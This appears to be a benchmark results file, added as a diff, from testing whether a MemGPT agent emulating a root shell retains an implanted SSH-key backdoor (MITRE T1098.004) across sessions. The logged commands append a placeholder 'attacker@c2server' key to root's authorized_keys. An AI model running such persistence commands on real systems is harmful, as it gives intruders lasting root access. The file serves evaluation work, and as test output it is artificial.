@@ -1,0 +1,60 @@
+{
+  "system": "memgpt",
+  "memgpt_version": "0.3.25",
+  "model": "deepseek-chat",
+  "noise_level": 0,
+  "n_reps": 1,
+  "timestamp": "2026-04-15T17:49:16.527175",
+  "results": [
+    {
+      "row": 1,
+      "label": "T1098.004 SSH Keys",
+      "avg_kr": 1.0,
+      "avg_sfs": 0.5487,
+      "avg_strict_kr": 1.0,
+      "avg_strict_sfs": 0.5487,
+      "avg_spr": 1.0,
+      "reps": [
+        {
+          "rep": 1,
+          "kr": 1.0,
+          "sfs": 0.5487,
+          "implant_viable": true,
+          "strict_kr": 1.0,
+          "strict_sfs": 0.5487,
+          "spr": 1.0,
+          "tokens": 18161,
+          "latency_ms": 54677.4,
+          "session_a_responses": [
+            {
+              "cmd": "mkdir -p /root/.ssh",
+              "response": "root@prod-server-01:~#"
+            },
+            {
+              "cmd": "chmod 700 /root/.ssh",
+              "response": "root@prod-server-01:~#"
+            },
+            {
+              "cmd": "echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7FakeKeyData... attacker@c2server\" >> /root/.ssh/authorized_keys",
+              "response": "root@prod-server-01:~#"
+            },
+            {
+              "cmd": "chmod 600 /root/.ssh/authorized_keys",
+              "response": "root@prod-server-01:~#"
+            },
+            {
+              "cmd": "cat /root/.ssh/authorized_keys",
+              "response": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7FakeKeyData... attacker@c2server\nroot@prod-server-01:~#"
+            }
+          ],
+          "session_b_responses": [
+            {
+              "cmd": "cat /root/.ssh/authorized_keys",
+              "response": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7FakeKeyData... attacker@c2server\nroot@prod-server-01:~#"
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
